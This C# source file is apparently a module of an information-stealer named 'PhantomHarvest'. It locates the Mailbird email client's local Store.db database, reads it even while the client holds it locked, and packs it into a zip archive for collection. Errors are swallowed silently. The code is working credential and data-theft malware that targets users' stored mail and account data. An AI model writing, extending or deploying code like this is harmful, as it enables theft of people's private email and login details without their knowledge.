using System;
using System.IO;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Mails
{
    internal class MailBird
    {
        public static void Collect(ArchiveManager zip)
        {
            try
            {
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Mailbird\\Store\\Store.db");
                if (File.Exists(path))
                {
                     byte[] fileBytes = LockedFile.ReadLockedFile(path);
                     if (fileBytes != null)
                     {
                         using (MemoryStream ms = new MemoryStream(fileBytes))
                         {
                             zip.AddStream(ArchiveManager.Compression.Deflate, MailBird.MailClientName + "/Store.db", ms, DateTime.Now, "");
                         }
                     }
                }
            }
            catch {}
        }

        public static string MailClientName = "MailBird";
    }
}
